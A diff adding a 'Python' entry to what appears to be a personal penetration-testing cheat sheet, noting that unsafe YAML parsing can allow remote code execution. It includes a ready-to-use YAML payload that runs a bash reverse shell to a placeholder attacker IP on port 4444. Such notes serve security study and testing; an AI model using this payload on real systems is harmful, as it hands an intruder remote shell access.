@@ -40,6 +40,14 @@ Collection of commands, tips and tricks and references I found useful during pre
   
 ## Website tips and tricks
 
+### Python
+
+* Unsafe YAML parsing may allow creation of Python objects and as a result remote code execution
+
+```
+!!python/object/apply:os.system ["bash -i >& /dev/tcp/yourIP/4444 0>&1"]
+```
+
 ### PHP
 
 * Check for LFI
